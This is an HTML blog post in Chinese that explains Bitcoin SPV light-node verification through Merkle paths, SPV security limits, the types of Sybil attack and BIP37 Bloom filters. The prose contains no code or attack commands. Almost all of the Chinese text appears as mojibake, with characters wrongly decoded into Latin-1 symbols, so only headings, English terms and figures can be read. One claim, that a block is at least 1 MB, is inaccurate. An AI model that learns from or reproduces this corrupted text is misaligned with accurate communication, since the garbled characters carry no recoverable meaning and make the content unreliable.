<h3 id="SPV-simple-payment-verification"><a href="#SPV-simple-payment-verification" class="headerlink" title="SPV(simple payment verification)"></a>SPV(simple payment verification)</h3><p>å…¨éªŒè¯èŠ‚ç‚¹å¯¹ç¡¬ä»¶æå‡ºäº†å¾ˆé«˜è¦æ±‚ï¼Œä¸ªäººç”¨æˆ·ï¼ˆç§»åŠ¨è®¾å¤‡ï¼‰å‚ä¸è¿™ä¸ªè¿‡ç¨‹å‡ ä¹æ˜¯ä¸å¯èƒ½çš„ã€‚ä¸ºäº†å®¢æˆ·å‹å¥½ï¼Œå¯¹äºä»…ä»…ä½¿ç”¨é’±åŒ…çš„æ™®é€šç”¨æˆ·ï¼Œä¹Ÿå³è½»é‡çº§çš„èŠ‚ç‚¹ï¼Œæ¯”ç‰¹å¸ç½‘ç»œä¸­çš„å¤§éƒ¨åˆ†ç”¨æˆ·éƒ½æ˜¯è½»é‡çº§çš„ç”¨æˆ·ï¼Œæ¯”ç‰¹å¸ç½‘ç»œå¹¶ä¸è¦æ±‚å®ƒä»¬ä¹Ÿå­˜å‚¨æ‰€æœ‰çš„ä¿¡æ¯ã€‚è¿™ç§èŠ‚ç‚¹åªéœ€è¦ç»´æŠ¤èƒ½å¤ŸéªŒè¯ç”¨æˆ·è‡ªå·±æ‰€careçš„äº¤æ˜“çš„éƒ¨åˆ†ä¿¡æ¯å°±è¡Œäº†ã€‚è¿™ä¹Ÿæ˜¯ä¸­æœ¬èªåœ¨æ¯”ç‰¹å¸ç™½çš®ä¹¦ä¸­æ‰€æå‡ºçš„SPVï¼ˆsimple payment verificationï¼‰çš„æ¦‚å¿µã€‚SPVå¯ä»¥ä¸éœ€æ•´ä¸ªç½‘ç»œçš„æ•°æ®è€Œç¡®è®¤äº¤æ˜“æ˜¯å¦å­˜åœ¨ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233040.jpg" alt="img"></p>
<p>è½»é‡çº§èŠ‚ç‚¹å¾€å¾€åªéœ€è¦å­˜å‚¨åŒºå—é“¾å¤´éƒ¨å°±å¯ä»¥äº†ã€‚ä½¿ç”¨æœ‰é™çš„ä¿¡æ¯ï¼Œè½»èŠ‚ç‚¹å°±èƒ½å¤Ÿè¯æ˜æŸä¸€ç¬”äº¤æ˜“æ˜¯å¦å­˜åœ¨ä¸åŒºå—é“¾ä¸­ã€‚åŒºå—å¤´æ˜¯80å­—èŠ‚ï¼Œä¸€ä¸ªåŒºå—è‡³å°‘æ˜¯1Mï¼Œå®Œæ•´äº¤æ˜“çš„åŒºå—æ¯”åŒºå—å¤´çš„è¦å¤§çš„å¤šã€‚å› ä¸ºåŒºå—å¤´éƒ¨ä¿¡æ¯å¾ˆå°‘ï¼Œæ¯å¹´çš„å¢åŠ æ€»é‡å¤§æ¦‚æ˜¯åœ¨5Må·¦å³ï¼Œæ‰€ä»¥ç®€å•çš„ç¡¬ä»¶è®¾å¤‡ä¹Ÿå®Œå…¨å¯ä»¥è¿è¡Œã€‚</p>
<p>é‚£é—®é¢˜æ˜¯ï¼ŒSPVæ˜¯æ€ä¹ˆå®ç°çš„å‘¢ï¼Ÿä¸ºä»€ä¹ˆä»…ä»…éœ€è¦æœ‰é™çš„ä¿¡æ¯å°±å¯ä»¥è¿›è¡ŒéªŒè¯ï¼Ÿ</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233041.jpg" alt="img">ä¸­æœ¬èªæ¯”ç‰¹å¸ç™½çš®ä¹¦ä¸­çš„ä¾‹å­</p>
<p>è­¬å¦‚ç”¨æˆ·Bobæ”¶åˆ°ç”¨æˆ·Aliceå‘æ¥çš„ä¸€ç¬”æ”¯ä»˜äº¤æ˜“ï¼Œè¿™æ—¶Bobå¿…é¡»è¦éªŒè¯è¿™ç¬”äº¤æ˜“ï¼ˆ1ï¼‰ç¡®å®å­˜åœ¨ï¼Œå¹¶ä¸”ï¼ˆ2ï¼‰ä¸æ˜¯åŒé‡æ”¯ä»˜ã€‚å¯¹äºSPVç”¨æˆ·è€Œè¨€ï¼Œéœ€è¦ä»å¯ä¿¡èŠ‚ç‚¹è·å¾—åŒºå—é“¾çš„å®Œæ•´çš„å¤´éƒ¨ä¿¡æ¯ï¼Œä»¥åŠå’Œä»–æƒ³éªŒè¯çš„äº¤æ˜“çš„Merkleåˆ†æ”¯ã€‚è¿™æ ·ï¼Œè™½ç„¶ç”¨æˆ·ä¸èƒ½è‡ªå·±éªŒè¯äº¤æ˜“ï¼Œä½†å¦‚æœèƒ½å¤Ÿä»åŒºå—é“¾çš„æŸå¤„æ‰¾åˆ°ç¬¦åˆçš„äº¤æ˜“ï¼Œå°±å¯ä»¥çŸ¥é“è¿™ç¬”äº¤æ˜“å·²è¢«ç½‘ç»œç¡®è®¤ï¼Œä¹Ÿå¯ä»¥ç¡®è®¤è¯¥ç¬”äº¤æ˜“å¾—åˆ°ç½‘ç»œå¤šå°‘ç¬”ç¡®è®¤ã€‚è­¬å¦‚ï¼ŒSPVèŠ‚ç‚¹è¦éªŒè¯ç¬¬300,000å·åŒºå—ä¸­çš„æŸä¸ªäº¤æ˜“ï¼Œå®ƒéœ€è¦è·å¾—300,000åŒºå—ä¸­äº¤æ˜“çš„Merkleåˆ†æ”¯ï¼ˆMerkleè·¯å¾„ï¼‰è¿›è¡ŒéªŒè¯ï¼Œå¹¶ä¸”ç­‰åˆ°åºå·ä»300,001åˆ°300,006çš„å…­ä¸ªåŒºå—å †å åœ¨è¯¥äº¤æ˜“æ‰€åœ¨çš„åŒºå—ä¸Šã€‚å¦‚æœç½‘ç»œä¸­çš„å…¶ä»–èŠ‚ç‚¹éƒ½æ¥å—äº†ç¬¬300,000åŒºå—ï¼Œå¹¶é€šè¿‡è¶³å¤Ÿçš„å·¥ä½œåœ¨è¯¥å—ä¹‹ä¸Šåˆç”Ÿæˆäº†å…­ä¸ªåŒºå—ï¼Œå°±å¯ä»¥è¯æ˜è¯¥äº¤æ˜“ä¸æ˜¯åŒé‡æ”¯ä»˜ã€‚</p>
<p>ä½¿ç”¨Merkleåˆ†æ”¯è¿›è¡ŒéªŒè¯æ˜¯Merkleæ ‘çš„Tamper proofæ€§è´¨ï¼Œ ä½¿ç”¨Merkleæ ‘ä¹‹åï¼Œå¯ä»¥å¾ˆå®¹æ˜“éªŒè¯åŒºå—ä¸­çš„äº¤æ˜“æœ‰æ²¡æœ‰è¢«ç¯¡æ”¹ã€‚è­¬å¦‚åœ¨ä¸Šå›¾ä¸­çš„ä¾‹å­ï¼Œå¦‚æœä¸€ä¸ªäº¤æ˜“ T<sub>H</sub>è¢«ç¯¡æ”¹æˆäº† T<sub>?</sub> ï¼Œé‚£ä¹ˆäº¤æ˜“çš„å“ˆå¸Œå€¼ä¼šä¸åŒï¼Œæ²¿ç€ä»åº•å±‚åˆ°æ ¹èŠ‚ç‚¹çš„è·¯å¾„å‘ä¸Šï¼Œä¼šå¯¼è‡´æœ€ç»ˆæ ‘çš„merkle rootä¸åŒï¼Œä¹Ÿå³ä¿å­˜åœ¨åŒºå—é“¾å¤´çš„å€¼ä¸åŒã€‚ç›¸åï¼Œå¦‚æœä»å¶å­èŠ‚ç‚¹åˆ°Merkleæ ¹çš„è·¯å¾„ä¸Šï¼Œæ‰€æœ‰çš„å“ˆå¸Œå€¼éƒ½éªŒè¯æ­£ç¡®ï¼Œé‚£ä¹ˆå¯ä»¥è¯æ˜è¿™ä¸ªäº¤æ˜“ç¡®å®å­˜åœ¨äºè¿™ä¸ªåŒºå—ä¸­ã€‚</p>
<p>å¦‚ä¸Šå›¾ï¼Œå¦‚æœéœ€è¦è¯æ˜æŸä¸ªåŒºå—ä¸Šæ˜¯å¦å­˜åœ¨ä¸€ç¬”äº¤æ˜“Tx3ï¼Œé‚£ä¹ˆå…¨èŠ‚ç‚¹è¿”å›çš„Merkleè·¯å¾„æ˜¯Hash2å’ŒHash01ã€‚åªéœ€è¦è¿™ä¸¤ä¸ªå€¼å°±å¯ä»¥è¿›è¡ŒéªŒè¯è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<ul>
<li>Step1ï¼šè®¡ç®—äº¤æ˜“Tx3çš„å“ˆå¸Œå€¼ï¼Œå¾—åˆ°Hash3</li>
<li>Step2ï¼šé€šè¿‡Hash2å’ŒHash3çš„å“ˆå¸Œå€¼ï¼Œå¾—åˆ°çˆ¶èŠ‚ç‚¹çš„å“ˆå¸Œå€¼Hash23</li>
<li>Step3ï¼šåŒä¸Šï¼Œé€šè¿‡è®¡ç®—Hash23å’ŒHash01å“ˆå¸Œå€¼ï¼Œå¾—åˆ°æ ¹èŠ‚ç‚¹çš„å“ˆå¸Œå€¼ã€‚</li>
<li>Step4ï¼šå°†ä¸Šä¸€æ­¥å¾—åˆ°çš„æ ¹å“ˆå¸Œå€¼å¯¹æ¯”åŒºå—å¤´ä¸­MerkleTreeçš„æ ¹å“ˆå¸Œå€¼ï¼Œå¦‚æœç›¸åŒï¼Œåˆ™è¯æ˜è¯¥åŒºå—ä¸­å­˜åœ¨äº¤æ˜“Tx3ï¼Œå¦åˆ™è¯´æ˜ä¸å­˜åœ¨ã€‚</li>
</ul>
<p>ä½¿ç”¨Merkleæ ‘å¯ä»¥å¤§å¤§é™ä½SPVèŠ‚ç‚¹çš„å­˜å‚¨å’Œè®¡ç®—è´Ÿæ‹…ï¼›ä¸‹é¢çš„è¡¨æ ¼å¯¹æ¯”äº†åŒºå—ä¸­ä¸åŒäº¤æ˜“æ•°é‡çš„æƒ…å†µä¸‹ï¼Œå®Œæ•´åŒºå—å¤§å°å’ŒMerkleè·¯å¾„å¤§å°çš„æƒ…å†µã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233042.jpg" alt="img"></p>
<p>SPVèŠ‚ç‚¹çš„å®‰å…¨æ€§</p>
<p>ï¼ˆ1ï¼‰è‹¥å…¨èŠ‚ç‚¹è¿”å›çš„æ˜¯ä¸€æ¡æ¶æ„çš„è·¯å¾„ï¼Ÿè¯•å›¾ä¸ºä¸€ä¸ªä¸å­˜åœ¨äºåŒºå—é“¾ä¸­çš„èŠ‚ç‚¹ä¼ªé€ ä¸€æ¡åˆæ³•çš„merkleè·¯å¾„ï¼Œä½¿å¾—æœ€ç»ˆçš„è®¡ç®—ç»“æœä¸åŒºå—å¤´ä¸­çš„é»˜å…‹å°”æ ¹å“ˆå¸Œç›¸åŒã€‚</p>
<p>ç”±äºå“ˆå¸Œçš„è®¡ç®—å…·æœ‰ä¸å¯é¢„æµ‹æ€§ï¼Œä½¿å¾—ä¸€ä¸ªæ¶æ„çš„â€œå…¨â€èŠ‚ç‚¹æƒ³è¦ä¸ºä¸€æ¡ä¸å­˜åœ¨çš„èŠ‚ç‚¹ä¼ªé€ ä¸€æ¡â€œä¼ªè·¯å¾„â€ä½¿å¾—æœ€ç»ˆè®¡ç®—çš„æ ¹å“ˆå¸Œä¸è½»èŠ‚ç‚¹æ‰€ç»´æŠ¤çš„æ ¹å“ˆå¸Œç›¸åŒæ˜¯ä¸å¯èƒ½çš„ã€‚</p>
<p>ï¼ˆ2ï¼‰ä¸ºä»€ä¹ˆä¸ç›´æ¥å‘å…¨èŠ‚ç‚¹è¯·æ±‚è¯¥èŠ‚ç‚¹æ˜¯å¦å­˜åœ¨äºåŒºå—é“¾ä¸­ï¼Ÿ</p>
<p>ç”±äºåœ¨å…¬é“¾çš„ç¯å¢ƒä¸­ï¼Œæ— æ³•åˆ¤æ–­è¯·æ±‚çš„å…¨èŠ‚ç‚¹æ˜¯å¦ä¸ºæ¶æ„èŠ‚ç‚¹ï¼Œå› æ­¤ç›´æ¥å‘æŸä¸€ä¸ªæˆ–è€…å¤šä¸ªå…¨èŠ‚ç‚¹è¯·æ±‚å¾—åˆ°çš„ç»“æœæ˜¯æ— æ³•å¾—åˆ°ä¿è¯çš„ã€‚ä½†æ˜¯è½»èŠ‚ç‚¹æœ¬åœ°ç»´æŠ¤çš„åŒºå—å¤´ä¿¡æ¯ï¼Œæ˜¯ç»è¿‡å·¥ä½œé‡è¯æ˜éªŒè¯çš„ï¼Œä¹Ÿå°±æ˜¯ç»è¿‡å…±è¯†ä¸€å®šæ­£ç¡®çš„ï¼Œè‹¥åˆ©ç”¨å…¨èŠ‚ç‚¹æä¾›çš„Merkleè·¯å¾„ï¼Œä¸å¾…éªŒè¯çš„èŠ‚ç‚¹è¿›è¡Œå“ˆå¸Œè®¡ç®—ï¼Œè‹¥æœ€ç»ˆç»“æœä¸æœ¬åœ°ç»´æŠ¤çš„åŒºå—å¤´ä¸­æ ¹å“ˆå¸Œä¸€è‡´ï¼Œåˆ™èƒ½å¤Ÿè¯æ˜è¯¥èŠ‚ç‚¹ä¸€å®šå­˜åœ¨äºé»˜å…‹å°”æ ‘ä¸­ã€‚</p>
<p>ï¼ˆ3ï¼‰SPVå®¹æ˜“å—åˆ°ä»€ä¹ˆæ”»å‡»ï¼Ÿ</p>
<p>SPVèŠ‚ç‚¹æ¯«æ— ç–‘é—®å¯ä»¥è¯å®æŸä¸ªäº¤æ˜“çš„å­˜åœ¨æ€§ï¼Œå®ƒä¹Ÿèƒ½å¤Ÿè¯æ˜æŸä¸ªåŒºå—ä¸­ä¸å­˜åœ¨æŸä¸ªäº¤æ˜“ï¼Œä½†å®ƒä¸èƒ½éªŒè¯æŸä¸ªäº¤æ˜“ï¼ˆè­¬å¦‚åŒä¸€ä¸ªUTXOçš„åŒé‡æ”¯ä»˜ï¼‰åœ¨æ•´ä¸ªé“¾ä¸­ä¸å­˜åœ¨ï¼Œè¿™æ˜¯å› ä¸ºSPVèŠ‚ç‚¹æ²¡æœ‰ä¸€ä»½å…³äºæ‰€æœ‰äº¤æ˜“çš„è®°å½•ã€‚è¿™ä¸ªæ¼æ´ä¼šè¢«é’ˆå¯¹SPVèŠ‚ç‚¹çš„æ‹’ç»æœåŠ¡æ”»å‡»æˆ–åŒé‡æ”¯ä»˜å‹æ”»å‡»æ‰€åˆ©ç”¨ã€‚ä¸ºäº†é˜²å¾¡è¿™äº›æ”»å‡»ï¼ŒSPVèŠ‚ç‚¹éœ€è¦éšæœºè¿æ¥åˆ°å¤šä¸ªèŠ‚ç‚¹ï¼Œä»¥å¢åŠ ä¸è‡³å°‘ä¸€ä¸ªå¯é èŠ‚ç‚¹ç›¸è¿æ¥çš„æ¦‚ç‡ã€‚è¿™ç§éšæœºè¿æ¥çš„éœ€æ±‚æ„å‘³ç€SPVèŠ‚ç‚¹ä¹Ÿå®¹æ˜“å—åˆ°ç½‘ç»œåˆ†åŒºæ”»å‡»æˆ–Sybilæ”»å‡»ã€‚åœ¨åè€…æƒ…å†µä¸­ï¼ŒSPVèŠ‚ç‚¹è¢«è¿æ¥åˆ°è™šå‡èŠ‚ç‚¹æˆ–è™šå‡ç½‘ç»œä¸­ï¼Œæ²¡æœ‰é€šå‘å¯é èŠ‚ç‚¹æˆ–çœŸæ­£çš„æ¯”ç‰¹å¸ç½‘ç»œçš„è¿æ¥ã€‚</p>
<p>åœ¨ç»å¤§å¤šæ•°çš„å®é™…æƒ…å†µä¸­ï¼Œå…·æœ‰è‰¯å¥½è¿æ¥çš„SPVèŠ‚ç‚¹æ˜¯è¶³å¤Ÿå®‰å…¨çš„ï¼Œå®ƒåœ¨èµ„æºéœ€æ±‚ã€å®ç”¨æ€§å’Œå®‰å…¨æ€§ä¹‹é—´ç»´æŒæ°å½“çš„å¹³è¡¡ã€‚å½“ç„¶ï¼Œå¦‚æœè¦ä¿è¯ä¸‡æ— ä¸€å¤±çš„å®‰å…¨æ€§ï¼Œæœ€å¯é çš„æ–¹æ³•è¿˜æ˜¯è¿è¡Œå®Œæ•´åŒºå—é“¾çš„èŠ‚ç‚¹ã€‚</p>
<blockquote>
<p>å®Œæ•´çš„åŒºå—é“¾èŠ‚ç‚¹æ˜¯é€šè¿‡æ£€æŸ¥æ•´ä¸ªé“¾ä¸­åœ¨å®ƒä¹‹ä¸‹çš„æ•°åƒä¸ªåŒºå—æ¥ä¿è¯è¿™ä¸ªUTXOæ²¡æœ‰è¢«æ”¯ä»˜ï¼Œä»è€ŒéªŒè¯äº¤æ˜“ã€‚è€ŒSPVèŠ‚ç‚¹æ˜¯é€šè¿‡æ£€æŸ¥åœ¨åŒ…å«è¯¥äº¤æ˜“çš„åŒºå—æ‰€æ”¶åˆ°çš„ç¡®è®¤æ•°ç›®æ¥éªŒè¯äº¤æ˜“ã€‚</p>
</blockquote>
<h2 id="Sybilæ”»å‡»"><a href="#Sybilæ”»å‡»" class="headerlink" title="Sybilæ”»å‡»"></a>Sybilæ”»å‡»</h2><p>Sybilæ”»å‡»æ˜¯æŒ‡åˆ©ç”¨ç¤¾äº¤ç½‘ç»œä¸­çš„å°‘æ•°èŠ‚ç‚¹æ§åˆ¶å¤šä¸ªè™šå‡èº«ä»½ï¼Œä»è€Œåˆ©ç”¨è¿™äº›èº«ä»½æ§åˆ¶æˆ–å½±å“ç½‘ç»œçš„å¤§é‡æ­£å¸¸èŠ‚ç‚¹çš„æ”»å‡»æ–¹å¼ ã€‚</p>
<p>ç›´æ¥é€šä¿¡ï¼šè¿›è¡Œsybilæ”»å‡»çš„ä¸€ç§å½¢å¼æ˜¯sybilç»“ç‚¹ç›´æ¥ä¸åˆæ³•ç»“ç‚¹è¿›è¡Œé€šä¿¡ã€‚å½“åˆæ³•ç»“ç‚¹å‘é€ä¸€ä¸ªæ— çº¿æ¶ˆæ¯ç»™sybilç»“ç‚¹æ—¶ï¼Œsybilç»“ç‚¹ä¸­çš„ä¸€ä¸ªä¼šç›‘å¬è¿™ä¸ªæ¶ˆæ¯ã€‚åŒæ ·åœ°ï¼Œä»æ‰€æœ‰sybilç»“ç‚¹å‘é€å‡ºçš„æ¶ˆæ¯äº‹å®ä¸Šä¹Ÿæ˜¯ä»åŒä¸€ä¸ªæ¶æ„è®¾å¤‡å‘å‡ºçš„ã€‚</p>
<p>é—´æ¥é€šä¿¡ï¼šåœ¨è¿™ä¸ªç‰ˆæœ¬çš„æ”»å‡»ä¸­ï¼Œæ²¡æœ‰ä¸€ä¸ªåˆæ³•çš„ç»“ç‚¹èƒ½å¤Ÿç›´æ¥ä¸sybilç»“ç‚¹è¿›è¡Œé€šä¿¡ã€‚ç›¸åï¼Œä¸€ä¸ªæˆ–å¤šä¸ªæ¶æ„çš„ç»“ç‚¹å®£ç§°ä»–ä»¬èƒ½å¤Ÿåˆ°è¾¾sybilç»“ç‚¹ã€‚å› æ­¤ï¼Œå‘é€ç»™sybilç»“ç‚¹çš„æ¶ˆæ¯éƒ½æ˜¯é€šè¿‡å…¶ä¸­çš„ä¸€ä¸ªæ¶æ„ç»“ç‚¹è¿›è¡Œè·¯ç”±è½¬å‘çš„ï¼Œè¿™ä¸ªæ¶æ„ç»“ç‚¹å‡è£…æŠŠè¿™ä¸ªæ¶ˆæ¯å‘é€ç»™sybilç»“ç‚¹ï¼Œè€Œäº‹å®ä¸Šå°±æ˜¯è¿™ä¸ªæ¶æ„ç»“ç‚¹è‡ªå·±æ¥æ”¶æˆ–è€…æ‹¦æˆªäº†è¿™ä¸ªæ¶ˆæ¯ã€‚</p>
<p>ä¼ªé€ èº«ä»½ï¼šåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä¸€ä¸ªæ”»å‡»è€…å¯ä»¥äº§ç”Ÿä»»æ„çš„sybilèº«ä»½ã€‚æ¯”å¦‚è¯´å¦‚æœä¸€ä¸ªç»“ç‚¹çš„èº«ä»½æ˜¯ä¸€ä¸ª32-ä½çš„æ•´æ•°ï¼Œé‚£ä¹ˆæ”»å‡»è€…å®Œå…¨å¯ä»¥ç›´æ¥ä¸ºæ¯ä¸€ä¸ªsybilç»“ç‚¹åˆ†é…ä¸€ä¸ª32-ä½çš„å€¼ä½œä¸ºå®ƒçš„èº«ä»½ã€‚</p>
<p>ç›—ç”¨èº«ä»½ï¼šå¦‚æœç»™å®šä¸€ç§æœºåˆ¶æ¥è¯†åˆ«ç»“ç‚¹çš„èº«ä»½ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±ä¸èƒ½ä¼ªé€ èº«ä»½äº†ã€‚ä¸¾ä¸ªä¾‹å­æ¥è¯´ï¼Œå‘½åç©ºé—´ï¼Œç”±äºå‘½åç©ºé—´æœ¬èº«å°±æ˜¯æœ‰é™çš„ï¼Œæ ¹æœ¬ä¸å…è®¸æ’å…¥ä¸€ä¸ªæ–°çš„èº«ä»½ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…éœ€è¦åˆ†é…ä¸€ä¸ªåˆæ³•çš„èº«ä»½ç»™sybilç»“ç‚¹ã€‚è¿™ç§èº«ä»½ç›—ç”¨åœ¨æ”»å‡»è€…æŠŠåŸæœ‰ç»“ç‚¹æ‘§æ¯æˆ–è€…ä½¿ä¹‹å¤±æ•ˆçš„æƒ…å†µä¸‹æ˜¯ä¸å¥½æ£€æµ‹çš„ã€‚</p>
<p>åŒæ—¶æ”»å‡»ï¼šæ”»å‡»è€…å°†å…¶æ‰€æœ‰çš„sybilèº«ä»½ä¸€æ¬¡æ€§çš„åŒæ—¶å‚ä¸åˆ°ä¸€æ¬¡<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1">ç½‘ç»œé€šä¿¡</a>ä¸­ã€‚å¦‚æœè§„å®šä¸€ä¸ªç»“ç‚¹åªèƒ½ä½¿ç”¨å®ƒçš„èº«ä»½ä¸€æ¬¡ï¼Œé‚£ä¹ˆè¿™ä¸ªæ¶æ„ç»“ç‚¹å°±å¯ä»¥å¾ªç¯çš„ä½¿ç”¨å®ƒçš„å¤šä¸ªsybilèº«ä»½è®©äººçœ‹èµ·æ¥æ˜¯å¤šä¸ªç»“ç‚¹ã€‚è¿™å°±æ˜¯<a href="https://baike.baidu.com/item/%E5%90%8C%E6%97%B6%E6%80%A7/3245687">åŒæ—¶æ€§</a>ã€‚</p>
<p>éåŒæ—¶æ”»å‡»ï¼šå¦‚æœæ”»å‡»è€…åªåœ¨ä¸€ä¸ªç‰¹å®šçš„<a href="https://baike.baidu.com/item/%E6%97%B6%E9%97%B4%E5%91%A8%E6%9C%9F/7539382">æ—¶é—´å‘¨æœŸ</a>é‡Œä½¿ç”¨ä¸€éƒ¨åˆ†sybilèº«ä»½ï¼Œè€Œåœ¨å¦å¤–ä¸€ä¸ªæ—¶é—´æ®µé‡Œæ˜¯è¿™äº›èº«ä»½æ¶ˆå¤±è€Œä»¥å¦å¤–çš„sybilèº«ä»½å‡ºç°ï¼Œè¿™çœ‹èµ·æ¥å°±åƒç½‘ç»œä¸­æ­£å¸¸çš„ç»“ç‚¹æ’¤é”€å’ŒåŠ å…¥ã€‚</p>
<h2 id="Bloom-Filter"><a href="#Bloom-Filter" class="headerlink" title="Bloom Filter"></a>Bloom Filter</h2><p>åœ¨ä¹‹å‰çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰æ¶‰åŠä¸€äº›ç»†èŠ‚ã€‚è­¬å¦‚ï¼ŒSPVèŠ‚ç‚¹ç›´æ¥å°±å‘å…¨èŠ‚ç‚¹è¯·æ±‚æŸä¸€äº¤æ˜“çš„Merkleè·¯å¾„ã€‚SPVèŠ‚ç‚¹æ€ä¹ˆæ ·ä»ç½‘ç»œä¸­æ¥æ”¶åˆ°ä¸è‡ªå·±ç›¸å…³çš„äº¤æ˜“ï¼Œç¡®å®šäº¤æ˜“æ‰€åœ¨çš„åŒºå—å‘¢ï¼Ÿ</p>
<p>SPVèŠ‚ç‚¹ä¸€èˆ¬åªéœ€è¦çš„æ˜¯å’Œè‡ªå·±çš„åœ°å€ç›¸å…³çš„äº¤æ˜“ã€‚åœ¨BIP37ä¹‹å‰ï¼ŒSPVçš„åšæ³•æ˜¯å°†æ‰€æœ‰çš„åŒºå—å’Œäº¤æ˜“éƒ½ä¸‹è½½ä¸‹æ¥ï¼Œç„¶åæœ¬åœ°å°†ä¸ç›¸å…³çš„äº¤æ˜“ç»™åˆ æ‰ã€‚å½“ç„¶å¸¦æ¥çš„é—®é¢˜å°±æ˜¯åŒæ­¥æ…¢ã€æµªè´¹å¸¦å®½ã€å¢åŠ å†…å­˜ä½¿ç”¨ã€‚åœ¨BIP-37ä¸­å°±æåˆ°äº†å› ä¸ºè¿™ä¸€ç‚¹ï¼Œå¯¼è‡´ç”¨æˆ·å¯¹æ‰‹æœºAPPâ€œBitcoin Walletâ€æœ‰æ‰€æŠ±æ€¨ã€‚</p>
<p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæœ€ç›´æ¥çš„åšæ³•å°±æ˜¯SPVèŠ‚ç‚¹ä»…å‘å…¨èŠ‚ç‚¹è¯·æ±‚å’Œè‡ªå·±åœ°å€ç›¸å…³çš„äº¤æ˜“ï¼Œä¹Ÿå³è¯·å…¨èŠ‚ç‚¹è¿‡æ»¤å’Œè‡ªå·±åœ°å€ä¸ç›¸å…³çš„ä¿¡æ¯ï¼Œå¦‚æœå…¨èŠ‚ç‚¹å‘ç°æŸä¸ªäº¤æ˜“ç¬¦åˆSPVèŠ‚ç‚¹çš„éœ€æ±‚æ—¶ï¼Œå°±å°†ä»¥Merkleblockæ¶ˆæ¯çš„å½¢å¼å‘é€è¯¥äº¤æ˜“ï¼ŒMerkleblockæ¶ˆæ¯åŒ…å«åŒºå—å¤´å’ŒMerkleè·¯å¾„ã€‚æ­¤æ—¶ï¼ŒSPVå°±éœ€è¦åœ¨è¯·æ±‚ä¸­é™„ä¸Šè‡ªå·±çš„åœ°å€ä¿¡æ¯ã€‚</p>
<p>å› æ­¤ä¸å…¨åŒºå—é“¾èŠ‚ç‚¹æ”¶é›†æ¯ä¸€ä¸ªåŒºå—å†…çš„å…¨éƒ¨äº¤æ˜“æ‰€ä¸åŒï¼ŒSPVèŠ‚ç‚¹å¯¹ç‰¹å®šæ•°æ®çš„è¯·æ±‚å¯èƒ½æ— æ„ä¸­é€éœ²äº†é’±åŒ…é‡Œçš„åœ°å€ä¿¡æ¯ã€‚å¦‚æœç›‘æ§ç½‘ç»œçš„ç¬¬ä¸‰æ–¹è·Ÿè¸ªæŸä¸ªSPVèŠ‚ç‚¹ä¸Šçš„é’±åŒ…æ‰€è¯·æ±‚çš„å…¨éƒ¨äº¤æ˜“ä¿¡æ¯ï¼Œå°±èƒ½åˆ©ç”¨è¿™äº›äº¤æ˜“ä¿¡æ¯æŠŠæ¯”ç‰¹å¸åœ°å€å’Œé’±åŒ…çš„ç”¨æˆ·å…³è”èµ·æ¥ã€‚</p>
<p>ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœåœ¨é—®è·¯æ—¶ï¼Œä½¿ç”¨å…·ä½“çš„åœ°å€ï¼Œå¦‚â€œå—äº¬è·¯188å·â€ï¼Œé‚£ä¹ˆå¯èƒ½å¾—åˆ°å…·ä½“çš„ä½ç½®ï¼›ä½†åŒæ—¶ä¹Ÿæ³„éœ²äº†ç›®çš„åœ°ã€‚å¦‚æœé—®ä¸åŒçš„äººï¼Œ188å·åœ¨å“ªé‡Œï¼Ÿå¯èƒ½å¾—åˆ°æ‰€æœ‰188å·çš„ä¿¡æ¯ï¼›ç„¶åé—®å—äº¬è·¯åœ¨å“ªé‡Œï¼Ÿå¯ä»¥å¾—åˆ°ä¸€æ•´æ¡è·¯çš„ä¿¡æ¯ã€‚é‚£ä¹ˆè™½ç„¶è·å¾—çš„ç­”æ¡ˆä¸­åŒ…æ‹¬ä¸€äº›æ— å…³çš„ä¿¡æ¯ï¼›ä½†æ˜¯ï¼Œç›¸å¯¹åº”çš„ï¼Œéšç§å¾—åˆ°äº†ä¸€å®šç¨‹åº¦çš„ä¿æŠ¤ã€‚</p>
<p>å› æ­¤ï¼Œåœ¨å¼•å…¥SPVèŠ‚ç‚¹&#x2F;è½»é‡çº§èŠ‚ç‚¹åä¸ä¹…ï¼Œæ¯”ç‰¹å¸å¼€å‘äººå‘˜å°±æ·»åŠ äº†ä¸€ä¸ªæ–°åŠŸèƒ½ï¼šBloomè¿‡æ»¤å™¨ã€‚è¿™æ˜¯åœ¨2012å¹´çš„BIP37ä¸­å¼•å…¥çš„ã€‚<a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0037.mediawiki">bitcoin&#x2F;bips</a> åœ¨æ¯”ç‰¹å¸ä¸­ï¼Œä½¿ç”¨Bloomè¿‡æ»¤å™¨æ¥åŠ å¿«é’±åŒ…åŒæ­¥ï¼›ä»¥å¤ªåŠä½¿ç”¨Bloomè¿‡æ»¤å™¨ç”¨äºå¿«é€ŸæŸ¥è¯¢ä»¥å¤ªåŠåŒºå—é“¾çš„æ—¥å¿—ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233043.jpg" alt="img"></p>
